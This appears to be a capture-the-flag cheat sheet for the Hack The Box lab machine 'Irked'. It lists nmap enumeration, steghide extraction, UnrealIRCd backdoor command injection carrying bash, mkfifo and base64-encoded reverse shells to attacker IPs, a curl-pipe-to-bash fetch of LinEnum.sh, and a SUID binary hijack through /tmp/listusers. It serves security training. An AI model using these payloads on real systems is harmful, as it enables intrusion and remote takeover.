@@ -1,0 +1,220 @@
+Name: IRKED
+IP: 10.10.10.117
+OS: Linux
+DIFF: EASY
+RELEASE: 17/Nov/2018
+
+[SYNOPSIS]
+
+Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows
+the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.
+
+[TOOLS]
+
+- NMAP
+- GOBUSTER
+- NCAT
+- CURL
+- WGET
+- STEGHIDE
+- METASPLOIT
+- SEARCHSPLOIT
+
+[1.ENUMERATION]
+
+[NMAP]
+
+>> nmap -p- -sC -sV 10.10.10.117
+>> nmap -vvv -p- -sC -sV 10.10.10.117
+>> nmap -sC -sV -p 8067 10.10.10.117
+>> nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.117
+>> nmap -p- --min-rate=1000 -T4 10.10.10.117 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//
+
+[GOBUSTER]
+
+>> gobuster -u http://10.10.10.117 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o report.log
+
+[CURL]
+
+>> curl http://10.10.10.117/irked.jpg -o irked.jpg
+
+>> curl http://10.10.14.3:8000/LinEnum.sh |bash    :: Download from the Attacker server LinEnum.sh script
+
+[WGET]
+
+>> wget http://10.10.10.117/irked.jpg
+
+>> wget http://10.10.14.3:8000/LinEnum.sh :: Download from the Attacker server LinEnum.sh script
+
+[STEGHIDE]
+
+>> steghide extract -sf irked.jpg -p P@ssW0RD
+
+[TCPDUMP]
+
+>> tcpdump -i tun0 icmp
+
+[*** 2. EXPLOITATION ***]
+
+
+[SEARCHSPLOIT]
+
+>> searchsploit unreal
+>> searchsploit -x exploits/linux/remote/16922.rb
+>> searchsploit -x exploits/linux/remote/13853.pl
+
+>> use exploit/unix/irc/unreal_ircd_3281_backdoor
+>> set TARGET < target-id >
+
+[NCAT]
+
+>> ncat -lvnp 9001
+
+>> ncat 10.10.10.117 8067
+
+>> echo "AB; ping -c 1 10.10.14.21" |ncat 10.10.10.117 8067
+
+>> echo 'AB; ping -c2 10.10.12.181' | nc 10.10.10.117 65534
+
+>> echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'" | ncat 10.10.10.117 8067
+
+>> echo "AB; bash -i >& /dev/tcp/10.10.14.3/9001 0>&1" | ncat 10.10.10.117 8067
+
+>> AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.21 443 >/tmp/f
+
+[MSFCONSOLE]
+
+>> msdb run    :: Start the database first.
+>> msfconsole
+
+
+[*** 3. PRIVILEGE ESCALATION ***]
+
+>> find / -perm /4000 2>/dev/null
+
+[LINENUM]
+
+>> bash LinEnum.sh
+
+[IRSSI]
+
+>> irssi -c 10.10.10.117 --port 8067
+
+
+[***LINUX COMMANDS***]
+
+>> showmount -e 10.10.10.117
+
+>> stty raw -echo 
+
+[EXPORT]
+
+    >> export TERM=xterm
+
+    >> export PATH=/dev/shm:$PATH
+
+[FIND]
+    >> find . -ls -type f
+
+    >> find . |grep -i user.txt
+
+    >> find / -perm /4000 2>/dev/null
+
+>> cp /bin/sh /tmp/listusers    :: Copying a shell to a path with permissions to execute it...
+
+>> strace ./viewer
+
+>> ltrace ./viewer
+
+>> base64 -w 0 /usr/bin/viewuser
+
+>> base64 -d viewuser.b64 > viewuser
+
+>> printf '/bin/sh' > /tmp/listusers
+
+[SCP]
+
+>> scp djmardov@10.10.10.117:/usr/bin/viewuser viewuser   :: Transfer the binary to local box.
+
+[PYTHON]
+
+>> python -c 'import pty;pty.spawn("/bin/bash")'    :: Spawn a tty shell using python
+
+>> python -m SimpleHTTPServer
+
+[SPAWNING A SHELL]
+
+>> echo 'bash -i >& /dev/tcp/10.10.12.181/1234 0>&1' | base64
+   echo 'AB; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMi4xODEvMTIzNCAwPiYxCg==
+   | base64 -d | bash' | nc 10.10.10.117 65534
+
+
+[LOCAL CONFIG]
+
+>> /etc/hosts
+    >> 10.10.10.117 irked.htb
+
+[SOME RESULTS]
+
+>> 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+
+>> 80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+
+>> 111/tcp open  rpcbind 2-4 (RPC #100000)
+
+>> <img src=irked.jpg>
+
+>> http http://10.10.10.117
+
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 83
+Content-Type: text/html
+Date: Fri, 07 Jun 2019 19:19:19 GMT
+ETag: "48-56c2e413aa86b-gzip"
+Keep-Alive: timeout=5, max=100
+Last-Modified: Mon, 14 May 2018 18:00:02 GMT
+Server: Apache/2.4.10 (Debian)
+Vary: Accept-Encoding
+
+<img src=irked.jpg>
+<br>
+<b><center>IRC is almost working!</b></center>
+
+[SUMMARY]
+
+- UnrealIRCd MSF exploit for initial foothold
+- steghide encoded file containing password for user
+- SUID binary for priv esc
+
+[SOURCES]
+
+- https://www.hackthebox.eu/home/machines/writeup/163
+- https://snowscan.io/htb-writeup-irked/#
+- https://0xdf.gitlab.io/2019/04/27/htb-irked.html
+- https://gitlab.com/0xdf/ctfscripts/tree/master/unreal_irc_3.2.8.1_shell.py
+- https://www.youtube.com/watch?v=OGFTM_qvtVI
+- https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/
+- https://github.com/vay3t/scan-htb
+
+
+[INDEX]
+
+00:39 - Begin on Recon 
+01:39 - Starting a full nmap scan 
+04:15 - Discovery of IRC 
+04:35 - Manually looking at IRC 
+06:00 - Looking at the IRC to understand how to connect to an IRC Server 
+07:00 - Pulling the IRC Version and discovering the exploit 
+08:50 - Going into the history of the IRC Backdoor 
+09:45 - Manually exploiting the IRC Server 
+13:10 - Shell returned on the server 
+14:30 - Discovery of .backup which gives a steg password 
+16:45 - Logging in with djmardov 
+21:20 - Discovery of SetUID enabled custom binary, viewuser 
+23:25 - Using ltrace to see what the binary does, executes the file /tmp/listusers 
+23:50 - Getting a root shell 25:50 - Testing exploiting the binary with "who", fails due to no setuid 
+27:50 - Looking at the binary within Ghidra
